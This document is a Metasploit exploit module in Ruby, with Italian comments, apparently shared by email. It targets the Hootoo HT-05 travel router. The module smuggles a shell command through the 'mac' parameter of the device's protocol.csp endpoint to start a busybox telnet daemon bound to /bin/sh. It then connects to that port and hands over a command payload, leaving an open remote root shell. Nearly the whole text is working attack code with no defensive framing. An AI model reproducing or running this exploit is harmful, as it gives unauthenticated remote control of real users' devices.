require &#039;net/http&#039;
require "uri"

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp

#
#Descrizione del Exploit
#
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Hootoo HT-05  remote shell exploit&#039;,

      &#039;Description&#039; => %q{
       This module tries to open a door in the device by exploiting the RemoteCodeExecution by creating a backdoor inside the device
         This exploit was written by Andrei Manole. Version of the frimware 2.000.022. Tested on 2.00.0.82 -> it still works
      },
      &#039;Author&#039;      => &#039;Andrei Manole&#039;,
      &#039;References&#039;  =>
        [
        ],
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [ &#039;unix&#039; ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 2000,
          &#039;BadChars&#039; => &#039;&#039;,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
              &#039;ConnectionType&#039; => &#039;find&#039;
            }
        }, #fine del settaggio del payload
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ],
        ],
      &#039;DisclosureDate&#039; => "20 Dicembre 2018",
      &#039;DefaultTarget&#039;  => 0))

    register_options([ Opt::RPORT(6666) ], self.class)

  end

def send_request(host,port)  #funzione di invio

        uri = URI.parse("http://#{host}/protocol.csp?function=set&fname=security&opt=mac_table&flag=close_forever&mac=|/bin/busybox%20telnetd%20-l/bin/sh%20-p#{port}")
        http = Net::HTTP.new(uri.host, uri.port)

       request = Net::HTTP::Get.new(uri.request_uri)
       response = http.request(request)

  if response.code == 200 || response.message ==  &#039;OK&#039; ||  response.class.name == &#039;HTTPOK&#039; then
        return true
      end

      return false

  end

  def exploit #exploit

    print_status("[+] Apertura backdoor in corso...")
    if !send_request(datastore[&#039;RHOST&#039;],datastore[&#039;RPORT&#039;]) then #controllo della funzione di invio , passando i dati scelti dal utenti mediante il datastore[] di msf.
      raise("[-] Errore nel apertura della porta")
    end
    print_good("[+] Richiesta inviata con successo! :)")
    nsock = self.connect(false, {"RPORT" => datastore[&#039;RPORT&#039;]}) rescue nil #inizio a fare la conessione
    print_good("[+] Porta aperta con successo ! :)")
    nsock.put(payload.encoded + " >/dev/null 2>&1") #passo il payload per creare una communicazione con la /bin/sh create sulla porta,  ">/dev/null 2>&1" invio Stand Error  in un backhole e dopo su 1 -> Standard Out.
    handler(nsock)

   return
  end

end

Sent with [ProtonMail](https://protonmail.com) Secure Email.

